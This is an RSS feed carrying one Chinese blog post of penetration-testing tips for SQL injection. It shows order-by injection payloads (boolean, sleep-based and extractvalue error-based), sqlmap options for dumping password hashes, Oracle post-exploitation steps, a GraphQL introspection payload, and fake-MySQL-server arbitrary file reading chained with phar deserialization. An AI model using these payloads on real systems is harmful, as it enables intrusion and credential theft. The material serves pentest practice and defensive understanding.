<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SQLi on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/sqli/</link><description>Recent content in SQLi on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 10 Jul 2023 01:26:07 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/sqli/index.xml" rel="self" type="application/rss+xml"/><item><title>SQL注入在实战中的Tips合集</title><link>https://amiaaaz.github.io/2023/07/10/sqli-tricks-in-pentest/</link><pubDate>Mon, 10 Jul 2023 01:26:07 +0800</pubDate><guid>https://amiaaaz.github.io/2023/07/10/sqli-tricks-in-pentest/</guid><description>&lt;p>从实战中总结的一些小技巧，希望能帮助到一些人www&lt;/p>
&lt;hr>
&lt;h2 id="order-by注入">order by注入&lt;/h2>
&lt;p>老生常谈，参数中出现可能为字段或表名、或出现排序有关的（比如desc, asc）就会被怀疑是sql注入点，但不是所有这种“疑似能注入”的地方都能被注——或者说重点关注什么样的字段是有说法的，这一点结合sql注入防御会更好理解&lt;/p>
&lt;p>以php为例，php.ini可以设置&lt;code>magic_quotes_gpc=on&lt;/code>开启对引号的转义，mysql中设&lt;code>secure_file_priv=null&lt;/code>，代码中使用PDO预编译并设置&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230705224758318.png" alt="image-20230705224758318">&lt;/p>
&lt;p>以上三项如果设置有误同样会导致报错注入的产生&lt;/p>
&lt;p>java中的防御步骤类似，除了叠waf以外 也无非是转义/预编译、黑/白名单、设权限三板斧，后两者先不论， &lt;strong>mybatis&lt;/strong>在对参数进行预处理时是不可以对order by后的参数使用&lt;code>#{}&lt;/code>的，而是只可以使用&lt;code>${}&lt;/code>！原因时order by语句后的字段名或字段位置是不可以加引号的，而使用预编译则一定会带&lt;code>'&lt;/code>，导致可能出现的注入（普通预编译也会这样）；而&lt;strong>Hibernate&lt;/strong>相对来说可以避免这一问题&lt;/p>
&lt;p>而order by注入本身由于语义的原因 是不能直接使用&lt;code>and 1=1&lt;/code>来判断的，需要用到条件语句做嵌套，举例：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#00a8c8">admin&lt;/span> &lt;span style="color:#00a8c8">order&lt;/span> &lt;span style="color:#00a8c8">by&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#f92672">#&lt;/span> &lt;span style="color:#111">example&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#00a8c8">admin&lt;/span> &lt;span style="color:#00a8c8">order&lt;/span> &lt;span style="color:#00a8c8">by&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">substr&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#00a8c8">user&lt;/span>&lt;span style="color:#111">()),&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>时间盲注也不能简单使用&lt;code>sleep()&lt;/code>，因为会对查询的每条内容执行排序 可能会造成ddos，需要用到子查询&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#00a8c8">admin&lt;/span> &lt;span style="color:#00a8c8">order&lt;/span> &lt;span style="color:#00a8c8">by&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">substr&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#00a8c8">user&lt;/span>&lt;span style="color:#111">()),&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">sleep&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#f92672">#&lt;/span> &lt;span style="color:#111">may&lt;/span> &lt;span style="color:#111">ddos&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#00a8c8">admin&lt;/span> &lt;span style="color:#00a8c8">order&lt;/span> &lt;span style="color:#00a8c8">by&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">substr&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#00a8c8">user&lt;/span>&lt;span style="color:#111">()),&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">),(&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#111">sleep&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>报错&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#00a8c8">admin&lt;/span> &lt;span style="color:#00a8c8">order&lt;/span> &lt;span style="color:#00a8c8">by&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">extractvalue&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">concat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">x3a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">version&lt;/span>&lt;span style="color:#111">())),&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="sqlmap实用参数">sqlmap实用参数&lt;/h2>
&lt;p>官方文档：https://github.com/sqlmapproject/sqlmap/wiki/Usage&lt;/p>
&lt;ul>
&lt;li>&lt;code>-p &amp;quot;&amp;lt;param&amp;gt;&amp;quot;&lt;/code>：指定注入参数，如遇POST+json类型的请求包（或需要自定义注入位置） 在要注入的位置加&lt;code>*&lt;/code>&lt;/li>
&lt;li>&lt;code>-U &amp;quot;CU&amp;quot; --passwords&lt;/code>：爆破当前用户的密码hash，&lt;code>--passwords&lt;/code>爆所有用户hash&lt;/li>
&lt;li>&lt;code>--csrf-token=&amp;quot;&amp;lt;csrf name&amp;gt;&amp;quot;&lt;/code>：指定页面隐藏的csrf-token参数，可通过&lt;code>--csrf-url=&amp;quot;&amp;lt;url&amp;gt;&amp;quot;&lt;/code>指定token来源的地址，还可以通过&lt;code>--eval&lt;/code>配合处理多个参数（效果拔群）&lt;/li>
&lt;li>&lt;code>--gui&lt;/code>：启动自带GUI界面，包含各种参数的使用说明&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230705174602794.png" alt="image-20230705174602794">&lt;/p>
&lt;ul>
&lt;li>sqlmap根目录下自带一个&lt;code>sqlmapapi.py&lt;/code> 封装了一些接口，可以通过这些接口发起扫描（不常见也不常用，但应该对造轮子有帮助&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230705174431111.png" alt="image-20230705174431111">&lt;/p>
&lt;h2 id="sqlmap坑点">sqlmap坑点&lt;/h2>
&lt;ul>
&lt;li>&lt;code>--batch&lt;/code>在windows和linux上表现不同&lt;/li>
&lt;li>如果不是&lt;code>-r&lt;/code>指定请求包，请注意sqlmap发包是否会导致相应包全是302，如果出现这种情况 建议指定部分请求头&lt;/li>
&lt;li>小概率出现：别人电脑上能跑出来注入 但你不行的玄学情况，偶发性bug 暂未找到原因&lt;/li>
&lt;/ul>
&lt;h2 id="oracle注入及后续利用">Oracle注入及后续利用&lt;/h2>
&lt;p>单独把Oracle数据库拿出来说的原因是sqlmap并不支持对它执行&lt;code>--os-cmd&lt;/code>或&lt;code>--os-shell&lt;/code>，所以与mysql, mssql相比稍有区别&lt;/p>
&lt;ol>
&lt;li>
&lt;p>收集信息，库名、表名一把梭，列列重要数据 &lt;del>（刷分用&lt;/del>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>查当前用户的密码hash并尝试爆明文&lt;/p>
&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>--is-dba # 是否dba
-U &amp;#34;CU&amp;#34; --passwords # 当前用户密码
--passwords # 所有用户密码
&lt;/code>&lt;/pre>&lt;ol start="3">
&lt;li>用sql-shell查当前SID和当前ip，尝试外连&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>select instance_name from v$instance
select sys_context(&amp;#39;userenv&amp;#39;,&amp;#39;ip_address&amp;#39;) from dual
&lt;/code>&lt;/pre>&lt;ol start="4">
&lt;li>如果可以外连，用 &lt;a href="https://github.com/SafeGroceryStore/MDUT">Multiple Database Utilization Tools&lt;/a>做后续利用&lt;/li>
&lt;/ol>
&lt;p>*此处举例用户名为sys（是dba），用户名这里需要改为&lt;code>sys as sysdba&lt;/code>才能正确连接！&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230705180830895.png" alt="image-20230705180830895">&lt;/p>
&lt;p>MDUT自带了HTTP隧道功能，还有常见的提权一把梭+列系统文件&lt;/p>
&lt;ol start="5">
&lt;li>
&lt;p>*如果不能外连但为高权限用户，尝试执行java代码反弹（待补充）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Navicat或DBeaver查看数据库内具体内容；Navicat可以使用对应的隧道&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="graphql注入">GraphQL注入&lt;/h2>
&lt;p>graphql有比较特殊的语法和查询方式，是便于前后端交互的语言 而不是便于后端和数据库交互的语言，后端数据都以graph 图的结构进行保存，需要设置好清晰的访问控制 不然就会被一锅端——graph的内省特性允许我们枚举数据库类型信息（见下）&lt;/p>
&lt;p>graphql本身就很少见 在实战环境中更是少中又少，但我之前hvv还真见过这种站点，怎么发现端点的不太记得清了（不是dirsearch就是burpsuite扒请求记录），这里简单记录一下实操过程：&lt;/p>
&lt;pre tabindex="0">&lt;code>https://example.com/graphql?query=xxxxx
&lt;/code>&lt;/pre>&lt;p>存在这样的可访问端点，直接用内省的payload枚举数据库结构信息&lt;/p>
&lt;pre tabindex="0">&lt;code>/graphql?query=fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
&lt;/code>&lt;/pre>&lt;p>再使用https://graphql-kit.com/graphql-voyager/进行图的生成&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230707152257406.png" alt="image-20230707152257406">&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230707150342238.png" alt="image-20230707150342238">&lt;/p>
&lt;p>通过可视化的结构构造查询数据的payload，构造方式参见 &lt;a href="https://graphql.cn/learn/queries/">官方文档&lt;/a>或 &lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection">这个仓库&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230707150640501.png" alt="image-20230707150640501">&lt;/p>
&lt;p>拿到敏感数据就可以轻松愉快的写报告了，几百分轻松get~&lt;/p>
&lt;p>当然了，如果站点做了详细的鉴权 那么所有的查询都是需要token的，没有token的我们只能到此为止了QAQ&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230707150842841.png" alt="image-20230707150842841">&lt;/p>
&lt;h2 id="伪服务端进行任意文件读">伪服务端进行任意文件读&lt;/h2>
&lt;p>原理不再赘述（可参见之前写过的博客-&amp;gt; &lt;a href="https://amiaaaz.github.io/2021/12/19/mysql-pseudo-server/">MySQL 伪服务端读客户端任意文件&lt;/a>），存在以下应用场景&lt;/p>
&lt;ul>
&lt;li>读配置文件&lt;/li>
&lt;/ul>
&lt;p>如后台可设置连接其它数据库，通过伪服务端读敏感信息（工具一把梭-&amp;gt; &lt;a href="https://github.com/4ra1n/mysql-fake-server">mysql-fake-server&lt;/a>&lt;/p>
&lt;ul>
&lt;li>(php)与phar反序列化、文件上传的结合&lt;/li>
&lt;/ul>
&lt;p>mysqli中的读文件会调用&lt;code>php_stream_open_wrapper_ex&lt;/code>函数，也就是说 如果任意读的文件是phar 就可以反序列化&lt;/p>
&lt;p>可以先通过反序列化链子构造phar（甚至不需要有链子，只要支持反序列化 比如最简单的sopaclient等等内置类反序列化），结合文件上传，再用mysql连接读这个phar 触发反序列化&lt;/p>
&lt;ul>
&lt;li>(java)jdbc反序列化&lt;/li>
&lt;/ul>
&lt;p>工具同上&lt;/p>
&lt;ul>
&lt;li>（防守）做蜜罐&lt;/li>
&lt;/ul>
&lt;p>微步有成型的蜜罐可开箱即用&lt;/p></description></item></channel></rss>